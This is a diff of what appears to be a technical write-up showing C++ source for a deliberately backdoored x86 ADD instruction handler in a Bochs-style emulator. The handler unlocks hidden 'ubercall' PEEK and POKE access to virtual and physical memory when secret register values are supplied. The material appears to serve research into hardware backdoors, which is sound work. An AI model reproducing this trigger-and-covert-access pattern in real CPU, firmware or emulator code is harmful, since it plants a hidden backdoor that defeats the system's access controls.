@@ -111,37 +111,37 @@ include a MAC (and store the MAC result in an additional register pair).
 
 Here is the backdoored ADD_GqEqR function:
 
- BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
+BX_INSF_TYPE BX_CPP_AttrRegparmN(1) BX_CPU_C::ADD_GqEqR(bxInstruction_c *i)
 {
-  Bit64u op1_64, op2_64, sum_64;
-  uint8_t error = 1;
-  uint8_t data = 0xcc;
-  uint8_t keystream [16];
- 
-   op1_64 = BX_READ_64BIT_REG(i->dst());
-   op2_64 = BX_READ_64BIT_REG(i->src());
-   sum_64 = op1_64 + op2_64;
+    Bit64u op1_64, op2_64, sum_64;
+    uint8_t error = 1;
+    uint8_t data = 0xcc;
+    uint8_t keystream [16];
 
-  /* Übercall calling convention:
-     authentication:
-     RAX = 0x99a0086fba28dfd1
-     RBX = 0xe2dd84b5c9688a03
+    op1_64 = BX_READ_64BIT_REG(i->dst());
+    op2_64 = BX_READ_64BIT_REG(i->src());
+    sum_64 = op1_64 + op2_64;
 
-     arguments:
-     RCX = ubercall number
-     RDX = argument 1 (usually an address)
-     RSI = argument 2 (usually a value)
+    /* Übercall calling convention:
+authentication:
+RAX = 0x99a0086fba28dfd1
+RBX = 0xe2dd84b5c9688a03
 
-     testing only:
-     RDI = return value
-     RBP = error indicator (1 iff an error occured)
-     ^^^^^ testing only ^^^^^
+arguments:
+RCX = ubercall number
+RDX = argument 1 (usually an address)
+RSI = argument 2 (usually a value)
 
-     ubercall numbers:
-     RCX = 0xabadbabe00000001 is PEEK to a virtual address 
-        return *(uint8_t *) RDX
-     RCX = 0xabadbabe00000002 is POKE to a virtual address
-        *(uint8_t *) RDX = RSI
+testing only:
+RDI = return value
+RBP = error indicator (1 iff an error occured)
+^^^^^ testing only ^^^^^
+
+ubercall numbers:
+RCX = 0xabadbabe00000001 is PEEK to a virtual address 
+return *(uint8_t *) RDX
+RCX = 0xabadbabe00000002 is POKE to a virtual address
+     *(uint8_t *) RDX = RSI
      if the page table walk fails, we don't generate any kind of fault or
      exception, we just write 1 to the error indicator field.
 
@@ -149,39 +149,39 @@ Here is the backdoored ADD_GqEqR function:
      process accesses memory
 
      RCX = 0xabadbabe00000003 is PEEK to a physical address 
-        return *(uint8_t *) RDX
+     return *(uint8_t *) RDX
      RCX = 0xabadbabe00000004 is POKE to a physical address
-        *(uint8_t *) RDX = RSI
+     *(uint8_t *) RDX = RSI
 
      (we only read/write 1 byte at a time because anything else could
      involve alignment issues and/or access that cross page boundaries)
      */
 
-  ctr_output(keystream);
-  if (((RAX ^ *((uint64_t *) keystream)) == 0x99a0086fba28dfd1) && ((RBX ^ *((uint64_t *) keystream + 1)) == 0xe2dd84b5c9688a03)) {
-      // we have a valid ubercall, let's do this texas-style
-      printf("COUNTER = %016lX\n", BX_CPU_THIS_PTR evil.i_counter);
-      printf("entered ubercall! RAX = %016lX RBX = %016lX RCX = %016lX RDX = %016lX\n", RAX, RBX, RCX, RDX);
-      BX_CPU_THIS_PTR evil.i_counter++;
-      ctr_output(keystream);
-      BX_CPU_THIS_PTR evil.i_counter++;
+    ctr_output(keystream);
+    if (((RAX ^ *((uint64_t *) keystream)) == 0x99a0086fba28dfd1) && ((RBX ^ *((uint64_t *) keystream + 1)) == 0xe2dd84b5c9688a03)) {
+        // we have a valid ubercall, let's do this texas-style
+        printf("COUNTER = %016lX\n", BX_CPU_THIS_PTR evil.i_counter);
+        printf("entered ubercall! RAX = %016lX RBX = %016lX RCX = %016lX RDX = %016lX\n", RAX, RBX, RCX, RDX);
+        BX_CPU_THIS_PTR evil.i_counter++;
+        ctr_output(keystream);
+        BX_CPU_THIS_PTR evil.i_counter++;
 
-      switch (RCX ^ *((uint64_t *) keystream)) {
-          case 0xabadbabe00000001: // peek, virtual
-              access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 1), 1, 0, BX_READ, (void *) &data, &error);
-              BX_CPU_THIS_PTR evil.evilbyte = data;
-              BX_CPU_THIS_PTR evil.evilstatus = error;
-              break;
-      }
-      BX_CPU_THIS_PTR evil.out_stat = 0; /* we start at the hi half of the
-                                            output block now */
-  }
+        switch (RCX ^ *((uint64_t *) keystream)) {
+            case 0xabadbabe00000001: // peek, virtual
+                access_read_linear_nofail(RDX ^ *((uint64_t *) keystream + 1), 1, 0, BX_READ, (void *) &data, &error);
+                BX_CPU_THIS_PTR evil.evilbyte = data;
+                BX_CPU_THIS_PTR evil.evilstatus = error;
+                break;
+        }
+        BX_CPU_THIS_PTR evil.out_stat = 0; /* we start at the hi half of the
+                                              output block now */
+    }
 
-  BX_WRITE_64BIT_REG(i->dst(), sum_64);
+    BX_WRITE_64BIT_REG(i->dst(), sum_64);
 
-  SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);
+    SET_FLAGS_OSZAPC_ADD_64(op1_64, op2_64, sum_64);
 
-  BX_NEXT_INSTR(i);
+    BX_NEXT_INSTR(i);
 }
 
 void BX_CPU_C::ctr_output(uint8_t *out) {
